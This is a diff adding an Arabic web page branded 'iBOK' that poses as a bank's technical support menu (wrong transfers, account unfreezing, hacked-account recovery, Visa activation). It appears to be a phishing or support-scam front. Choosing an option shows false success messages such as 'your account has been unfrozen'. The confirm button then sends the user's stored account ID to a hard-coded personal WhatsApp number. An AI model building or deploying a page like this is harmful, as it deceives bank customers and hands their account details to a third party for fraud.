@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خيارات تفاعلية - iBOK</title>
+    <link rel="stylesheet" href="styles.css"> 
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    </head>
+<body>
+
+    <div class="container">
+        <header class="header">
+            <div class="logo-text">iBOK اي بوك</div>
+            <div class="service-name">خدمات الدعم الفني</div>
+        </header>
+
+        <div class="welcome-banner">
+            الرجاء اختيار الخدمة المطلوبة للمتابعة عبر الواتساب.
+        </div>
+
+        <div class="form-card" style="padding: 30px;">
+            <div class="card-title">اختيار الخدمة</div>
+            <div class="card-subtitle">حدد خيارًا واحدًا للمتابعة:</div>
+            
+            <div class="options-container">
+                
+                <label class="option-item">
+                    <input type="checkbox" class="hidden-checkbox" name="service_option" data-action="بلاغ عن تحويل خاطئ" data-toast="تم تسجيل بلاغ حول التحويل الخاطئ بنجاح.">
+                    <span class="custom-checkbox"></span>
+                    <span class="option-icon">💸</span>
+                    <span class="option-text">تحويل خاطئ</span>
+                </label>
+
+                <label class="option-item">
+                    <input type="checkbox" class="hidden-checkbox" name="service_option" data-action="طلب تغيير رقم الهاتف" data-toast="تم تسجيل طلب تغيير الهاتف بنجاح.">
+                    <span class="custom-checkbox"></span>
+                    <span class="option-icon">📱</span>
+                    <span class="option-text">تغيير الهاتف</span>
+                </label>
+
+                <label class="option-item">
+                    <input type="checkbox" class="hidden-checkbox" name="service_option" data-action="طلب رفع سقف الحوالات" data-toast="تم تسجيل طلب رفع السقف بنجاح.">
+                    <span class="custom-checkbox"></span>
+                    <span class="option-icon">📈</span>
+                    <span class="option-text">رفع السقف</span>
+                </label>
+
+                <label class="option-item">
+                    <input type="checkbox" class="hidden-checkbox" name="service_option" data-action="مشكلة كلمة مرور خاطئة" data-toast="تم تسجيل محاولة دخول بكلمة مرور خاطئة.">
+                    <span class="custom-checkbox"></span>
+                    <span class="option-icon">🔒</span>
+                    <span class="option-text">كلمة مرور خاطئة</span>
+                </label>
+
+                <label class="option-item">
+                    <input type="checkbox" class="hidden-checkbox" name="service_option" data-action="تفعيل خدمة العملات الأجنبية" data-toast="تم تفعيل خدمة العملات الأجنبية.">
+                    <span class="custom-checkbox"></span>
+                    <span class="option-icon">💱</span>
+                    <span class="option-text">خدمة العملات الأجنبية</span>
+                </label>
+
+                <label class="option-item">
+                    <input type="checkbox" class="hidden-checkbox" name="service_option" data-action="طلب فك حظر وتجميد الحساب" data-toast="تم فك الحظر والتجميد عن حسابك.">
+                    <span class="custom-checkbox"></span>
+                    <span class="option-icon">✅</span>
+                    <span class="option-text">فك حظر وتجميد</span>
+                </label>
+
+                <label class="option-item">
+                    <input type="checkbox" class="hidden-checkbox" name="service_option" data-action="استرداد حساب مخترق" data-toast="تم تسجيل طلب استرداد الحساب المخترق.">
+                    <span class="custom-checkbox"></span>
+                    <span class="option-icon">🛡️</span>
+                    <span class="option-text">استرداد حساب مخترق</span>
+                </label>
+
+                <label class="option-item">
+                    <input type="checkbox" class="hidden-checkbox" name="service_option" data-action="تفعيل بطاقة فيزا" data-toast="تم تفعيل بطاقة فيزا الخاصة بك بنجاح.">
+                    <span class="custom-checkbox"></span>
+                    <span class="option-icon">💳</span>
+                    <span class="option-text">تفعيل فيزا</span>
+                </label>
+                
+            </div>
+            
+        </div>
+        
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <a href="#" class="whatsapp-fixed" id="whatsappBtn">
+        <i class="fab fa-whatsapp"></i> تأكيد الطلب
+    </a>
+
+<script type="module">
+    const checkboxes = document.querySelectorAll('input[type="checkbox"]');
+    const toast = document.getElementById('toast');
+    let selectedRequest = null; // لتخزين رسالة واتساب
+    let selectedToast = null; // لتخزين رسالة الإشعار
+
+    checkboxes.forEach(ch => {
+        ch.addEventListener('change', function () {
+            // إلغاء تحديد كل العناصر الأخرى (مهم لاختيار واحد فقط)
+            checkboxes.forEach(otherCh => {
+                if(otherCh !== this) {
+                    otherCh.checked = false;
+                }
+            });
+
+            if(this.checked){
+                selectedRequest = this.getAttribute('data-action');
+                selectedToast = this.getAttribute('data-toast');
+
+                toast.innerText = selectedToast;
+                toast.style.display = 'block';
+                setTimeout(()=> { toast.style.display = 'none'; }, 2500);
+            } else {
+                 selectedRequest = null;
+            }
+        });
+    });
+
+    const whatsappBtn = document.getElementById('whatsappBtn');
+    whatsappBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        if(!selectedRequest) {
+            alert('الرجاء اختيار خدمة واحدة للمتابعة.');
+            return;
+        }
+        
+        // استخدام رقم افتراضي إذا لم يتم العثور على رقم المستخدم
+        const userID = localStorage.getItem('userID') || 'غير محدد'; 
+        const phoneNumber = '+249117591023'; // مثال على رقم واتساب (الرجاء استبداله برقمك الفعلي)
+        
+        const message = `مرحباً، أود تأكيد طلبي: ${selectedRequest}. رقم حسابي: ${userID}`;
+        const encodedMessage = encodeURIComponent(message);
+        
+        window.open(`https://wa.me/${phoneNumber}?text=${encodedMessage}`, '_blank');
+    });
+</script>
+
+</body>
+</html>ِ
